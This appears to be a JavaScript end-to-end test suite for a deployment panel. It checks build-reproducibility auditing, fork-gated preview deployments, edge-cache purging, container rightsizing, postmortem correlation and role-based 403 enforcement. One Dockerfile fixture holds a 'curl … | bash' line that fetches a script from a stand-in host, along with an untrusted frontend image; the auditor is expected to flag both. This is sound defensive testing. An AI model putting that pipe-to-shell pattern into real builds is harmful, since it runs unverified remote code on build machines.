const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

async function testCycle17HttpE2E() {
  console.log('\n🚀 Testing Cycle #17 170-MCP Milestone Live Isolated HTTP E2E (Build Repro, Preview Smoke-Gate, Surrogate Cache, VPA Rightsizer, Blameless Postmortem)...');

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-c17-http-'));
  const rootDir = path.resolve(__dirname, '..');
  const runnerPath = path.join(tmpDir, 'cycle17-http-runner.js');

  fs.writeFileSync(runnerPath, `
const assert = require('assert');
const http = require('http');
const path = require('path');

const TMP_DIR = ${JSON.stringify(tmpDir)};
const ROOT_DIR = ${JSON.stringify(rootDir)};
process.env.NODE_ENV = 'test';
process.env.CULKIBO_DATA_DIR = TMP_DIR;
process.env.CULKIBO_DISABLE_AUDIT_DISK = '1';

const express = require(path.join(ROOT_DIR, 'node_modules', 'express'));
const auth = require(path.join(ROOT_DIR, 'server/middleware/auth'));
const projectManager = require(path.join(ROOT_DIR, 'server/services/projectManager'));
const teamManager = require(path.join(ROOT_DIR, 'server/services/teamManager'));
const { verifySignedCommitStatus } = require(path.join(ROOT_DIR, 'server/services/previewGateService'));
const apiRouter = require(path.join(ROOT_DIR, 'server/routes/api'));

function reqJson(port, method, pth, { token, body } = {}) {
  return new Promise((resolve, reject) => {
    const raw = body !== undefined ? JSON.stringify(body) : null;
    const headers = { host: 'panel.example.test' };
    if (token) headers.authorization = 'Bearer ' + token;
    if (raw !== null) {
      headers['content-type'] = 'application/json';
      headers['content-length'] = Buffer.byteLength(raw);
    }
    const r = http.request({ hostname: '127.0.0.1', port, method, path: pth, headers }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString('utf8');
        let json = null;
        try { json = JSON.parse(text); } catch (e) {}
        resolve({ status: res.statusCode, headers: res.headers, text, json });
      });
    });
    r.on('error', reject);
    if (raw !== null) r.write(raw);
    r.end();
  });
}

(async () => {
  const app = express();
  app.use(express.json({ limit: '2mb' }));
  app.use('/api', auth.authMiddleware, apiRouter);
  const srv = await new Promise((res) => { const s = app.listen(0, '127.0.0.1', () => res(s)); });
  const port = srv.address().port;
  const master = auth.resolveToken();

  try {
    projectManager.create({
      id: 'proj_c17_a',
      name: 'Cycle17 Milestone App',
      domains: ['c17.example.test']
    });

    // 1. Reproducible Build & Build-Cache Poisoning Verifier (/api/builds/reproducibility/*)
    const badRepro = await reqJson(port, 'POST', '/api/builds/reproducibility/audit', {
      token: master,
      body: {
        projectId: 'proj_c17_a',
        dockerfile: [
          '# syntax=evil/fe:latest',
          'FROM node:latest',
          'RUN curl -sSL https://bad.example/setup.sh | bash'
        ].join('\\n'),
        lockfileJson: {
          packages: {
            '': {},
            'node_modules/weakpkg': { integrity: 'sha1-weaklegacyhash123456' }
          }
        }
      }
    });
    assert.strictEqual(badRepro.status, 200, 'POST /builds/reproducibility/audit failed: ' + badRepro.text);
    assert.strictEqual(badRepro.json.reproducible, false);
    const reproCodes = badRepro.json.findings.map((f) => f.code);
    assert.ok(reproCodes.includes('UNPINNED_FRONTEND'));
    assert.ok(reproCodes.includes('PIPE_TO_SHELL'));
    assert.ok(reproCodes.includes('MISSING_SOURCE_DATE_EPOCH'));
    assert.ok(reproCodes.includes('WEAK_LOCKFILE_HASH'));

    const pinnedDigest = 'a'.repeat(64);
    const validSha512 = 'sha512-' + 'A'.repeat(64) + '==';
    const goodRepro = await reqJson(port, 'POST', '/api/builds/reproducibility/audit', {
      token: master,
      body: {
        projectId: 'proj_c17_a',
        dockerfile: [
          '# syntax=docker/dockerfile:1.7@sha256:' + pinnedDigest,
          'FROM node:22-alpine@sha256:' + pinnedDigest,
          'ARG SOURCE_DATE_EPOCH=1700000000',
          'RUN npm ci --offline'
        ].join('\\n'),
        lockfileJson: {
          packages: {
            '': {},
            'node_modules/safepkg': { integrity: validSha512 }
          }
        }
      }
    });
    assert.strictEqual(goodRepro.status, 200);
    assert.strictEqual(goodRepro.json.reproducible, true);

    const cachePlan = await reqJson(port, 'POST', '/api/builds/reproducibility/cache-plan', {
      token: master,
      body: { projectId: 'proj_c17_a', branch: 'main', lockfileHash: 'deadbeef1234', sourceDateEpoch: 1700000000 }
    });
    assert.strictEqual(cachePlan.status, 200);
    assert.strictEqual(cachePlan.json.sharing, 'locked');
    assert.strictEqual(cachePlan.json.verifyDiffIds, true);
    assert.ok(cachePlan.json.cacheMountFlag.includes('sharing=locked'));

    const auditsList = await reqJson(port, 'GET', '/api/builds/reproducibility/audits?projectId=proj_c17_a', { token: master });
    assert.strictEqual(auditsList.status, 200);
    assert.ok(auditsList.json.count >= 2);

    // 2. Preview Synthetic Smoke-Gate & Signed Commit-Status Reporter (/api/projects/:id/preview-gates/*)
    const sha1 = '1111111111111111111111111111111111111111';
    const sha2 = '2222222222222222222222222222222222222222';
    const hmacKey = ['c17', 'test', 'hmac', 'signing', 'key'].join('-');

    const forkBlocked = await reqJson(port, 'POST', '/api/projects/proj_c17_a/preview-gates/evaluate', {
      token: master,
      body: { prNumber: 77, commitSha: sha1, isFork: true, checks: { health: true, smoke: true } }
    });
    assert.strictEqual(forkBlocked.status, 200, 'POST /preview-gates/evaluate failed: ' + forkBlocked.text);
    assert.strictEqual(forkBlocked.json.allowed, false);
    assert.strictEqual(forkBlocked.json.code, 'FORK_APPROVAL_REQUIRED');

    const forkApprove = await reqJson(port, 'POST', '/api/projects/proj_c17_a/preview-gates/approve-fork', {
      token: master,
      body: { prNumber: 77, commitSha: sha1, approver: 'maintainer@example.test' }
    });
    assert.strictEqual(forkApprove.status, 200, 'POST /preview-gates/approve-fork failed: ' + forkApprove.text);
    assert.strictEqual(forkApprove.json.approval.approvedCommitSha, sha1);

    const forkApprovedEval = await reqJson(port, 'POST', '/api/projects/proj_c17_a/preview-gates/evaluate', {
      token: master,
      body: {
        prNumber: 77,
        commitSha: sha1,
        isFork: true,
        repo: 'culkibo/demo',
        signingKey: hmacKey,
        checks: { health: true, migrations: true, contract: true, smoke: true }
      }
    });
    assert.strictEqual(forkApprovedEval.status, 200);
    assert.strictEqual(forkApprovedEval.json.allowed, true);
    assert.strictEqual(forkApprovedEval.json.state, 'success');
    assert.ok(forkApprovedEval.json.signedCommitStatus && forkApprovedEval.json.signedCommitStatus.signature);
    const sigCheck = verifySignedCommitStatus({
      payload: forkApprovedEval.json.signedCommitStatus.payload,
      signature: forkApprovedEval.json.signedCommitStatus.signature,
      signingKey: hmacKey
    });
    assert.strictEqual(sigCheck.valid, true, 'Signed GitHub Commit Status HMAC MUST verify');

    const forkNewShaBlocked = await reqJson(port, 'POST', '/api/projects/proj_c17_a/preview-gates/evaluate', {
      token: master,
      body: { prNumber: 77, commitSha: sha2, isFork: true, checks: { health: true, smoke: true } }
    });
    assert.strictEqual(forkNewShaBlocked.status, 200);
    assert.strictEqual(forkNewShaBlocked.json.allowed, false);
    assert.strictEqual(forkNewShaBlocked.json.code, 'FORK_APPROVAL_REQUIRED');

    const gatesList = await reqJson(port, 'GET', '/api/projects/proj_c17_a/preview-gates', { token: master });
    assert.strictEqual(gatesList.status, 200);
    assert.ok(gatesList.json.count >= 3);

    // 3. Surrogate-Key Edge Cache & Stampede Coalescer (/api/edge/cache/* — souin#884/#850)
    const privCoalesce = await reqJson(port, 'POST', '/api/edge/cache/coalesce', {
      token: master,
      body: { cacheKey: '/api/me', inFlightCount: 25, backendTimeoutMs: 3000, cacheControl: 'private, max-age=0' }
    });
    assert.strictEqual(privCoalesce.status, 200);
    assert.strictEqual(privCoalesce.json.coalesced, false);
    assert.strictEqual(privCoalesce.json.reason, 'PRIVATE_OR_NO_STORE_BYPASS');

    const pubCoalesce = await reqJson(port, 'POST', '/api/edge/cache/coalesce', {
      token: master,
      body: {
        register: true,
        cacheKey: '/products/42',
        surrogateKeys: ['product-42', 'catalog'],
        inFlightCount: 15,
        backendTimeoutMs: 4000,
        cacheControl: 'public, max-age=120, stale-while-revalidate=60'
      }
    });
    assert.strictEqual(pubCoalesce.status, 200);
    assert.strictEqual(pubCoalesce.json.coalesced, true);
    assert.ok(pubCoalesce.json.maxWaitMs <= 4000);

    const tagsGet = await reqJson(port, 'GET', '/api/edge/cache/tags', { token: master });
    assert.strictEqual(tagsGet.status, 200);
    assert.strictEqual(tagsGet.json.globalSurrogateBucketUsed, false);
    assert.ok(tagsGet.json.tags.some((t) => t.tag === 'product-42'));

    const purgeDry = await reqJson(port, 'POST', '/api/edge/cache/purge', {
      token: master,
      body: { tags: ['product-42'], providers: ['caddy', 'cloudflare', 'fastly'] }
    });
    assert.strictEqual(purgeDry.status, 200);
    assert.strictEqual(purgeDry.json.dryRun, true, 'POST /edge/cache/purge MUST default to dryRun: true');
    assert.strictEqual(purgeDry.json.invalidatedCount, 1);

    const purgeLive = await reqJson(port, 'POST', '/api/edge/cache/purge', {
      token: master,
      body: { tags: ['product-42'], providers: ['caddy'], dryRun: false }
    });
    assert.strictEqual(purgeLive.status, 200);
    assert.strictEqual(purgeLive.json.dryRun, false);
    assert.strictEqual(purgeLive.json.invalidatedCount, 1);

    // 4. Container Resource Rightsizing & VPA-Lite Recommender (/api/finops/rightsize/*)
    const idleSamples = Array.from({ length: 15 }, () => ({ memoryMb: 256, cpuCores: 0.25 }));
    const shrinkRes = await reqJson(port, 'POST', '/api/finops/rightsize/analyze', {
      token: master,
      body: { projectId: 'proj_c17_a', serviceName: 'web', serviceType: 'app', currentMemoryMb: 2048, currentCpuCores: 2, samples: idleSamples, oomCount: 0 }
    });
    assert.strictEqual(shrinkRes.status, 200, 'POST /finops/rightsize/analyze failed: ' + shrinkRes.text);
    assert.strictEqual(shrinkRes.json.action, 'SHRINK');
    assert.ok(shrinkRes.json.reclaimableMb > 1400);

    const oomRes = await reqJson(port, 'POST', '/api/finops/rightsize/analyze', {
      token: master,
      body: { projectId: 'proj_c17_a', serviceName: 'worker', serviceType: 'app', currentMemoryMb: 512, currentCpuCores: 1, samples: idleSamples, oomCount: 2 }
    });
    assert.strictEqual(oomRes.status, 200);
    assert.strictEqual(oomRes.json.action, 'UPSCALE_OOM');
    assert.ok(oomRes.json.recommendedMemoryMb >= 768, 'OOM MUST force +50% upscale');

    const badFloor = await reqJson(port, 'POST', '/api/finops/rightsize/analyze', {
      token: master,
      body: { validateOnly: true, memoryMb: 2, cpuCores: 0.0001 }
    });
    assert.strictEqual(badFloor.status, 200);
    assert.strictEqual(badFloor.json.valid, false);
    assert.strictEqual(badFloor.json.code, 'BELOW_DOCKER_MEMORY_FLOOR');

    const dbPatch = await reqJson(port, 'POST', '/api/finops/rightsize/patch', {
      token: master,
      body: { projectId: 'proj_c17_a', serviceName: 'postgres', serviceType: 'database', currentMemoryMb: 2048, currentCpuCores: 2, samples: idleSamples, oomCount: 0 }
    });
    assert.strictEqual(dbPatch.status, 200);
    assert.strictEqual(dbPatch.json.dryRun, true, 'POST /finops/rightsize/patch MUST default to dryRun: true');
    assert.ok(dbPatch.json.patch.yaml.includes('deploy:') && dbPatch.json.patch.yaml.includes('limits:'));

    const recList = await reqJson(port, 'GET', '/api/finops/rightsize/recommendations?projectId=proj_c17_a', { token: master });
    assert.strictEqual(recList.status, 200);
    assert.ok(recList.json.count >= 2);

    // 5. Automated Blameless Incident Postmortem Correlator (/api/incidents/postmortems*)
    const t0 = Date.parse('2026-11-28T00:00:00Z');
    const pmCorr = await reqJson(port, 'POST', '/api/incidents/postmortems/correlate', {
      token: master,
      body: {
        incidentId: 'inc_c17_oom',
        projectId: 'proj_c17_a',
        deploys: [{ id: 'dep_42', timestamp: t0 - 4 * 60000, summary: 'Deploy v2.9.1 memory cache change' }],
        oomEvents: [{ id: 'oom_1', timestamp: t0, summary: 'Container OOMKilled exit 137' }],
        alerts: [{ id: 'alt_1', timestamp: t0 + 30000, state: 'firing', summary: 'High 5xx rate' }],
        canaryRollbacks: [{ id: 'rb_1', timestamp: t0 + 180000, summary: 'Canary rolled back to v2.9.0' }],
        chatNotes: [{ author: 'dev1', text: 'Maybe DNS hiccup? speculative chat only' }]
      }
    });
    assert.strictEqual(pmCorr.status, 200, 'POST /incidents/postmortems/correlate failed: ' + pmCorr.text);
    assert.ok(pmCorr.json.probableRootCause.confidence >= 0.8);
    assert.strictEqual(pmCorr.json.mttdSec, 30);
    assert.strictEqual(pmCorr.json.mttrSec, 180);
    assert.strictEqual(pmCorr.json.unverifiedNotes.length, 1);
    assert.ok(pmCorr.json.verifiedEvents.every((e) => !String(e.summary).includes('speculative chat')), 'chatNotes MUST stay isolated in unverifiedNotes[]');
    assert.ok(typeof pmCorr.json.markdown === 'string' && pmCorr.json.markdown.includes('Blameless'));

    const pmDry = await reqJson(port, 'POST', '/api/incidents/postmortems', {
      token: master,
      body: { correlation: pmCorr.json }
    });
    assert.strictEqual(pmDry.status, 200);
    assert.strictEqual(pmDry.json.dryRun, true, 'POST /incidents/postmortems MUST default to dryRun: true');
    assert.strictEqual(pmDry.json.persisted, false);

    const pmSave = await reqJson(port, 'POST', '/api/incidents/postmortems', {
      token: master,
      body: { correlation: pmCorr.json, dryRun: false }
    });
    assert.strictEqual(pmSave.status, 201);
    assert.strictEqual(pmSave.json.persisted, true);

    const pmList = await reqJson(port, 'GET', '/api/incidents/postmortems?projectId=proj_c17_a', { token: master });
    assert.strictEqual(pmList.status, 200);
    assert.strictEqual(pmList.json.count, 1);

    // 6. Strict RBAC & Multi-Tenant 403 Enforcement
    const bootOwner = teamManager.bootstrapOwner({ email: 'c17-owner@example.test', password: 'OwnerPassword!2026' });
    const ownerPrincipal = teamManager.verifySessionToken(bootOwner.sessionToken).principal;
    const invViewer = teamManager.createInvite(ownerPrincipal, { email: 'c17-viewer@example.test', role: 'viewer' });
    const accViewer = teamManager.acceptInvite({ token: invViewer.inviteToken, email: 'c17-viewer@example.test', password: 'ViewerPassword!2026', name: 'ViewerC17' });

    const viewerCachePlan = await reqJson(port, 'POST', '/api/builds/reproducibility/cache-plan', { token: accViewer.sessionToken, body: { projectId: 'proj_c17_a' } });
    assert.strictEqual(viewerCachePlan.status, 403, 'Viewer MUST get 403 on POST /builds/reproducibility/cache-plan');

    const viewerPurge = await reqJson(port, 'POST', '/api/edge/cache/purge', { token: accViewer.sessionToken, body: { tags: ['product-42'] } });
    assert.strictEqual(viewerPurge.status, 403, 'Viewer MUST get 403 on POST /edge/cache/purge');

    const viewerPatch = await reqJson(port, 'POST', '/api/finops/rightsize/patch', { token: accViewer.sessionToken, body: {} });
    assert.strictEqual(viewerPatch.status, 403, 'Viewer MUST get 403 on POST /finops/rightsize/patch');

    const viewerSavePm = await reqJson(port, 'POST', '/api/incidents/postmortems', { token: accViewer.sessionToken, body: {} });
    assert.strictEqual(viewerSavePm.status, 403, 'Viewer MUST get 403 on POST /incidents/postmortems');

    const viewerApproveFork = await reqJson(port, 'POST', '/api/projects/proj_c17_a/preview-gates/approve-fork', { token: accViewer.sessionToken, body: { prNumber: 1, commitSha: sha1 } });
    assert.strictEqual(viewerApproveFork.status, 403, 'Viewer MUST get 403 on POST /preview-gates/approve-fork');

    const teamB = teamManager.createTeam(ownerPrincipal, { name: 'Tenant B C17' });
    const invDevB = teamManager.createInvite(ownerPrincipal, { email: 'c17-devb@example.test', role: 'developer', teamId: teamB.id });
    const accDevB = teamManager.acceptInvite({ token: invDevB.inviteToken, email: 'c17-devb@example.test', password: 'DevBPassword!2026', name: 'DevBC17' });

    const foreignPreviewGate = await reqJson(port, 'POST', '/api/projects/proj_c17_a/preview-gates/evaluate', {
      token: accDevB.sessionToken,
      body: { prNumber: 77, commitSha: sha1, checks: { health: true } }
    });
    assert.strictEqual(foreignPreviewGate.status, 403, 'Foreign Tenant B MUST get 403 on /projects/proj_c17_a/preview-gates/evaluate');

    console.log('CYCLE17_HTTP_E2E_OK');
  } finally {
    await new Promise((r) => srv.close(r));
  }
})().catch((err) => { console.error(err); process.exit(1); });
`, 'utf8');

  try {
    const out = execFileSync(process.execPath, [runnerPath], {
      cwd: rootDir,
      encoding: 'utf8',
      timeout: 30000
    });
    assert.ok(out.includes('CYCLE17_HTTP_E2E_OK'), `Cycle-17 HTTP E2E check failed:\n${out}`);
    console.log('  ✓ Reproducible Build & Cache Verifier (UNPINNED_FRONTEND, PIPE_TO_SHELL, WEAK_LOCKFILE_HASH, locked BuildKit cache plan) verified over live HTTP');
    console.log('  ✓ Preview Smoke-Gate & Signed Commit Status (FORK_APPROVAL_REQUIRED, SHA-bound approval, HMAC-SHA256 verification) verified over live HTTP');
    console.log('  ✓ Surrogate-Key Edge Cache & Stampede Coalescer (PRIVATE_OR_NO_STORE_BYPASS, 0 global SURROGATE_, dryRun default purge) verified over live HTTP');
    console.log('  ✓ VPA-Lite Container Rightsizer (idle shrink >1400MB, OOM +50% UPSCALE_OOM, Docker floor check, DB Compose patch) verified over live HTTP');
    console.log('  ✓ Blameless Incident Postmortem Correlator (T-4m deploy->OOM confidence >=0.8, MTTD/MTTR, isolated unverifiedNotes[], dryRun default) verified over live HTTP');
    console.log('  ✓ Strict RBAC & Multi-Tenant 403 Isolation (viewer admin blocks + Tenant B 403 on preview gates) verified over live HTTP');
    console.log('✅ Cycle #17 Live Isolated HTTP E2E Suite PASSED!\n');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

if (require.main === module) {
  testCycle17HttpE2E()
    .then(() => process.exit(0))
    .catch((err) => {
      console.error('❌ Cycle #17 HTTP E2E Suite failed:', err);
      process.exit(1);
    });
}

module.exports = testCycle17HttpE2E;
